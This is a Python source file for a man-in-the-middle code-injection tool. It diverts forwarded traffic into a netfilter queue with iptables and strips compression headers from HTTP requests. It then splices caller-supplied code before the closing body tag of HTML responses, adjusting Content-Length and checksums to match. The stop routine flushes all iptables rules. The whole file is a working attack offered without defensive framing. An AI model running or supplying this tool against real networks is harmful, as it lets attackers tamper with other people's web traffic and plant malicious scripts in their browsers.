from netfilterqueue import NetfilterQueue
import scapy.all as scapy
import subprocess
import re


class CodeInjector:
    def __init__(self, injection_code):
        self.injection_code = injection_code
        self.queue = NetfilterQueue()

    def set_load(self, packet, load):
        packet[scapy.Raw].load = load
        del packet[scapy.IP].len
        del packet[scapy.IP].chksum
        del packet[scapy.TCP].chksum
        return packet

    def process_packet(self, packet):
        scapy_packet = scapy.IP(packet.get_payload())
        if scapy_packet.haslayer(scapy.Raw):
            try:
                load = scapy_packet[scapy.Raw].load.decode()
                if scapy_packet[scapy.TCP].dport == 80:
                    load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)

                elif scapy_packet[scapy.TCP].sport == 80:
                    load = load.replace("</body>", self.injection_code + "</body>")
                    content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
                    if content_length_search and "text/html" in load:
                        content_length = content_length_search.group(1)
                        new_content_length = int(content_length) + len(self.injection_code)
                        load = load.replace(content_length, str(new_content_length))

                if load != scapy_packet[scapy.Raw].load:
                    new_packet = self.set_load(scapy_packet, load)
                    packet.set_payload(bytes(new_packet))
            except UnicodeDecodeError:
                pass

        packet.accept()

    def inject_code(self):
        subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)

        self.queue.bind(0, self.process_packet)
        self.queue.run()

    def stop_injecting(self):
        self.queue.unbind()
        subprocess.call("iptables --flush", shell=True)
